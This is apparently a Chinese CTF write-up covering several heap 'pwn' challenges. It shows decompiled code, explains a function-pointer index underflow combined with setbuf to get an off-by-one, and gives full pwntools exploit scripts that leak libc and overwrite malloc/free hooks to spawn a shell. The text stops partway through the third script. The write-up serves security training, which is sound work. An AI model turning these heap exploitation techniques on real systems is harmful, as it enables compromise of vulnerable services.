<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> node            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> is_in_use       dd ?</span><br><span class="line"><span class="number">00000004</span> chunk_size      dd ?</span><br><span class="line"><span class="number">00000008</span> chunk_addr      dq ?</span><br><span class="line"><span class="number">00000010</span> node            ends</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Store</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  node **v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// ebx</span></span><br><span class="line">  _BYTE *chunk_addr; <span class="comment">// rax</span></span><br><span class="line">  node *v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(dword_202080[<span class="number">0</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = dword_202080;</span><br><span class="line">    idx = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *((_DWORD *)v0 + <span class="number">4</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++idx;</span><br><span class="line">      v0 += <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ( idx == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">"Too many TODOs :P\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        fflush(<span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"contents: "</span>);</span><br><span class="line">  chunk_addr = <span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br><span class="line">  v3 = (node *)&amp;dword_202080[<span class="number">2</span> * idx];</span><br><span class="line">  v3-&gt;chunk_addr = (__int64)chunk_addr;</span><br><span class="line">  v3-&gt;is_in_use = <span class="number">1</span>;</span><br><span class="line">  v3-&gt;chunk_size = get_input(chunk_addr, <span class="number">0x68</span>);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"check: %llx\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Delete会清空node，释放chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Delet</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  node *v1; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"which: "</span>);</span><br><span class="line">  idx = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">7</span> || !LODWORD(dword_202080[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx]) )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Invalid ID :P\n"</span>, <span class="number">1u</span>LL, <span class="number">0xE</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = (node *)&amp;dword_202080[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx];</span><br><span class="line">  v1-&gt;is_in_use = <span class="number">0</span>;</span><br><span class="line">  v1-&gt;chunk_size = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)v1-&gt;chunk_addr);</span><br><span class="line">  v1-&gt;chunk_addr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Post首先让用户选择一个idx的node，之后选择Alice/Bob/Jenny/Danny(实际四个选项最后对应的函数功能一致)，根据给的这里的idx2，选择调用对应index的函数指针。函数指针数组的内容如下，这里没有限制idx_2的最小值，因此可以下溢，访问到0x202020之前的数据作为函数指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">Post</span><span class="params">(__int64 IO_FILE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> idx_2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"which: "</span>);</span><br><span class="line">  idx = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">7</span> || (idx1 = idx, !LODWORD(dword_202080[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx])) )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Invalid ID :P\n"</span>, <span class="number">1u</span>LL, <span class="number">0xE</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  menu1();</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"who: "</span>);</span><br><span class="line">  idx_2 = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( idx_2 &gt; <span class="number">3</span> )                              <span class="comment">// 下溢出？</span></span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Invalid person :P\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(__int64, __int64, <span class="keyword">unsigned</span> <span class="keyword">int</span>))funcs_1375[idx_2])(</span><br><span class="line">    IO_FILE,</span><br><span class="line">    (__int64)dword_202080[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx1 + <span class="number">1</span>],</span><br><span class="line">    HIDWORD(dword_202080[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx1]));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">.data:0000000000202010 00 00 00 00 00 00 00 00+                align 20h</span></span><br><span class="line"><span class="comment">.data:0000000000202020 4E 0C 00 00 00 00 00 00+funcs_1375      dq offset Alice0        ; DATA XREF: Post+F5↑o</span></span><br><span class="line"><span class="comment">.data:0000000000202020 F7 0C 00 00 00 00 00 00+                                        ; Post+FC↑r</span></span><br><span class="line"><span class="comment">.data:0000000000202020 A0 0D 00 00 00 00 00 00+                dq offset Bob1</span></span><br><span class="line"><span class="comment">.data:0000000000202020 49 0E 00 00 00 00 00 00                 dq offset Jenny2</span></span><br><span class="line"><span class="comment">.data:0000000000202020                                         dq offset Danny3</span></span><br><span class="line"><span class="comment">.data:0000000000202020                         _data           ends</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>到这里我们调试可以发现Got表在函数指针数组的上方，因此可以访问任意got表函数，我们再看下调用函数的参数及后面发生的事情。固定调用三个参数为IO_FILE，chunk_addr以及chunk_size。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((<span class="keyword">void</span> (__fastcall *)(__int64, __int64, <span class="keyword">unsigned</span> <span class="keyword">int</span>))funcs_1375[idx_2])(</span><br><span class="line">    IO_FILE,</span><br><span class="line">    (__int64)dword_202080[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx1 + <span class="number">1</span>],</span><br><span class="line">    HIDWORD(dword_202080[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx1]));</span><br></pre></td></tr></table></figure>
<p>第一个参数是IO_FILE的其实很有限，我当时想的是想办法将IO_FILE的缓冲区关联到一块可控区域，不过尝试了几个函数都不行，最后去看别的pwn了，赛后陆晨学长说是setbuf的洞，搜了一下才发现确实之前有出过类似的题目，linux man一下sebuf，大概</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DESCRIPTION</span><br><span class="line">       The  three  types of buffering available are unbuffered, block buffered, and</span><br><span class="line">       line buffered.  When an output stream is unbuffered, information appears  on</span><br><span class="line">       the  destination  file  or  terminal  as  soon  as written; when it is block</span><br><span class="line">       buffered many characters are saved up and written as a  block;  when  it  is</span><br><span class="line">       line  buffered characters are saved up until a newline is output or input is</span><br><span class="line">       read from any stream attached to a terminal device (typically  stdin).   The</span><br><span class="line">       function  fflush(3)  may  be  used  to  force  the  block  out  early.  (See</span><br><span class="line">       fclose(3).)</span><br><span class="line"></span><br><span class="line">       Normally all files are block buffered.  If a stream refers to a terminal (as</span><br><span class="line">       stdout  normally  does),  it  is  line  buffered.  The standard error stream</span><br><span class="line">       stderr is always unbuffered by default.</span><br><span class="line"></span><br><span class="line">       The setvbuf() function may be used on any open stream to change its  buffer.</span><br><span class="line">       The mode argument must be one of the following three macros:</span><br><span class="line"></span><br><span class="line">              _IONBF unbuffered</span><br><span class="line"></span><br><span class="line">              _IOLBF line buffered</span><br><span class="line"></span><br><span class="line">              _IOFBF fully buffered</span><br><span class="line"></span><br><span class="line">       Except  for  unbuffered  files, the buf argument should point to a buffer at</span><br><span class="line">       least size bytes long; this buffer will be used instead of the current  buf‐</span><br><span class="line">       fer.   If  the argument buf is NULL, only the mode is affected; a new buffer</span><br><span class="line">       will be allocated on the next read or write operation.  The setvbuf()  func‐</span><br><span class="line">       tion may be used only after opening a stream and before any other operations</span><br><span class="line">       have been performed on it.</span><br><span class="line"></span><br><span class="line">       The other three calls are, in effect, simply aliases for calls to setvbuf().</span><br><span class="line">       The setbuf() function is exactly equivalent to the call</span><br><span class="line">       setvbuf(stream, buf, buf ? _IOFBF : _IONBF, BUFSIZ);</span><br></pre></td></tr></table></figure>
<p>大概意思就是说缓冲区有三种模式，无缓冲/行缓冲/满缓冲，sebuf等于下面的形式，我们可以做个实验，给个char*的buf，sebuf(stdout,buf);使用printf输出的时候并没输出到终端上，而是进入了buf数组。</p>
<p>到这里这里的利用其实已经有头绪了，我们将stderr(固定参数1，可以通过看汇编找前面rdi的来源确定)同chunk_addr关联起来，再输入一个invalid choice触发<code>_fprintf_chk((__int64)stderr, 1LL, (__int64)&quot;unknown options, foolish %s&quot;, (__int64)byte_202100);</code>当我们输入的name长度为0x50时，实际输入到heap的长度为25+0x50=0x69，从而在heap中可以off-by-one。</p>
<p>这里注意fflush两次才能让数据全部进入到heap，这也是学长试验出来的，后面构造ub的overlap，Delete之后用另一个调用Alice或其他函数泄露libc，最后get shell</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">Alice0</span><span class="params">(__int64 IO_FILE, __int64 chunk_addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> chunk_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-118h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v4, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)_sprintf_chk(</span><br><span class="line">                       (__int64)&amp;v4,</span><br><span class="line">                       <span class="number">1L</span>L,</span><br><span class="line">                       <span class="number">0x100</span>LL,</span><br><span class="line">                       (__int64)<span class="string">"Send %d bytes: %s to Alice\n"</span>,</span><br><span class="line">                       chunk_size,</span><br><span class="line">                       chunk_addr)</span><br><span class="line">     - <span class="number">1</span> &gt; <span class="number">0xFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Msg Size error!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x10</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Store</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"contents: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Post</span><span class="params">(index0,index1)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which: '</span>)</span><br><span class="line">    p.sendline(str(index0))</span><br><span class="line">    p.recvuntil(<span class="string">'who: '</span>)</span><br><span class="line">    p.sendline(str(index1))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MakeU</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'17'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Frist input your name&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'a'</span>*<span class="number">0x4f</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Store(<span class="string">'0\n'</span>)</span><br><span class="line">    Store(<span class="string">'1\n'</span>)</span><br><span class="line">    Store(<span class="string">'2\n'</span>)</span><br><span class="line">    Store(<span class="string">'3\n'</span>)</span><br><span class="line">    Store(<span class="string">'4\n'</span>)</span><br><span class="line">    Store(<span class="string">'5\n'</span>)</span><br><span class="line"></span><br><span class="line">    Post(<span class="number">0</span>,<span class="number">-21</span>)</span><br><span class="line">    MakeU()</span><br><span class="line">    MakeU()</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Store(<span class="string">'1\n'</span>)<span class="comment">#1</span></span><br><span class="line">    Store(<span class="string">'6\n'</span>)<span class="comment">#6 == 2</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Post(<span class="number">2</span>,<span class="number">-21</span>)</span><br><span class="line">    MakeU()</span><br><span class="line">    MakeU()</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Store(<span class="string">'3\n'</span>)<span class="comment">#3</span></span><br><span class="line">    Store(<span class="string">'7\n'</span>)<span class="comment">#7 == 4</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Post(<span class="number">1</span>,<span class="number">-21</span>)</span><br><span class="line">    MakeU()</span><br><span class="line">    MakeU()</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Post(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"Send 1 bytes: "</span>)</span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>,drop=<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">2</span>]</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    Store(p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    Store(<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    Store(<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x555555554000+0x136e')</span></span><br><span class="line">    Store(<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr)+<span class="string">'\n'</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>一道典型的菜单题，漏洞在于Edit的off-by-null，libc是2.29，断网环境+不熟悉导致开局就先放弃了这个，后面研究了一下2.29的新保护机制发现这个根本用不上那些。</p>
<p>程序有add、delete、edit、show。直接用Off-by-one释放一个大的块作为Ub，泄露地址之后往一个0x240的块fd写free_hook即可。</p>
<h4 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"cnt:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx:'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"cnt:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx:'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hint</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Because I know you are 666!\n"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0</span>,<span class="number">0x238</span>,<span class="string">'0'</span>*<span class="number">0x238</span>)</span><br><span class="line">    Add(<span class="number">1</span>,<span class="number">0x238</span>,<span class="string">'1\n'</span>)</span><br><span class="line">    Add(<span class="number">2</span>,<span class="number">0x233</span>,p64(<span class="number">0x21</span>)*<span class="number">17</span>+<span class="string">'\n'</span>)<span class="comment">#0x240</span></span><br><span class="line">    Add(<span class="number">3</span>,<span class="number">0x233</span>,p64(<span class="number">0x21</span>)*<span class="number">17</span>+<span class="string">'\n'</span>)<span class="comment">#0x240</span></span><br><span class="line">    Add(<span class="number">4</span>,<span class="number">0x233</span>,p64(<span class="number">0x21</span>)*<span class="number">17</span>+<span class="string">'\n'</span>)<span class="comment">#0x240</span></span><br><span class="line">    Add(<span class="number">5</span>,<span class="number">0x233</span>,p64(<span class="number">0x21</span>)*<span class="number">17</span>+<span class="string">'\n'</span>)<span class="comment">#0x240</span></span><br><span class="line">    Add(<span class="number">6</span>,<span class="number">0x233</span>,p64(<span class="number">0x21</span>)*<span class="number">17</span>+<span class="string">'\n'</span>)<span class="comment">#0x240</span></span><br><span class="line">    Add(<span class="number">7</span>,<span class="number">0x233</span>,p64(<span class="number">0x21</span>)*<span class="number">17</span>+<span class="string">'\n'</span>)<span class="comment">#0x240</span></span><br><span class="line">    Add(<span class="number">8</span>,<span class="number">0x233</span>,p64(<span class="number">0x21</span>)*<span class="number">17</span>+<span class="string">'\n'</span>)<span class="comment">#0x240</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'0'</span>*<span class="number">0x230</span>+<span class="string">'\x01\x09'</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)<span class="comment">#1+2+3+4</span></span><br><span class="line">    Add(<span class="number">1</span>,<span class="number">0x230</span>,<span class="string">'1\n'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">    Show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x0000555555554000+0x14e5')</span></span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    free_hook = libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">3</span>,<span class="number">0x6b0</span>,<span class="string">'a'</span>*<span class="number">0x230</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x241</span>)+p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    Hint(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    Hint(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>pwn3其实也是一道2.29的题，没给libc所以开始先做的这个，后面发现是2.29又换题看了。</p>
<p>功能包括Add Delete Edit，还有一次leak的机会，Add固定长度为0x48，leak的对象是chunk_list[0]。Edit里是循环判断idx，idx可以为负数前溢出，Delete里有double free。</p>
<p>利用思路是UAF分配到chunk0的size部分，改成0x420(large bin)，在其后布置另一个fake chunk，释放chunk0即可泄露地址，再UAF即可get shell。</p>
<h4 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn3'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; 